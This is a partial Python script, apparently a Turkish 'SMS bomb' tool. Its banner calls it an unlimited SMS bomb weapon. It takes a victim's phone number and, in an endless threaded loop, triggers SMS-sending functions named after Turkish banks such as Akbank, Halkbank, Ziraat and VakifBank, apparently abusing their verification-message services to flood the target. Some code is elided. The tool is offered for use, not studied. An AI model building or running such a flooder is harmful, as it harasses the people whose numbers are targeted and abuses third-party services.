...
while 1:
    ...
    ║  {Fore.YELLOW}Sınırsız Sms Bombası Silahı{Fore.LIGHTCYAN_EX}                          ║
    ║  {Fore.GREEN}Kullanırken Çok Büyük Değerler Girme Boku Yersin{Fore.LIGHTCYAN_EX} ║
    ║  {Fore.RED}Bu silah serhat tarafından güncellenmiştir.{Fore.LIGHTCYAN_EX}           ║
    ║  {Fore.CYAN}instagram: xw.serhat{Fore.LIGHTCYAN_EX}                                     ║
    ║  {Fore.LIGHTMAGENTA_EX}█████████████████████████████████████████████{Fore.LIGHTCYAN_EX}      ║
    ╚═════════════════════════════════════════════════════╝
    {Style.RESET_ALL}""")

    try:
        menu = (input(Fore.LIGHTMAGENTA_EX + " 1- SMS Gönder (Normal Mod)\n\n 2- SMS Gönder (Hayvani Mod)\n\n 3- Çıkış\n\n" + Fore.LIGHTYELLOW_EX + " Seçim: "))
        if menu == "":
            continue
        menu = int(menu) 
    except ValueError:
    ...
    if menu == 1:
        system("cls||clear")
        print(Fore.LIGHTYELLOW_EX + "Telefon numarasını başında '+90' olmadan yaz (Birden çoksa 'enter' tuşuna basınız): "+ Fore.LIGHTGREEN_EX, end="")
        tel_no = input()
        tel_liste = []
        if tel_no == "": 
            system("cls||clear")
            ...
            while True:
                with ThreadPoolExecutor() as executor:
                    futures = [
                        ...
                        executor.submit(send_sms.Akbank),
                        executor.submit(send_sms.Halkbank),
                        executor.submit(send_sms.ZiraatBank),
                        executor.submit(send_sms.VakifBank)
                    ]
                    wait(futures)
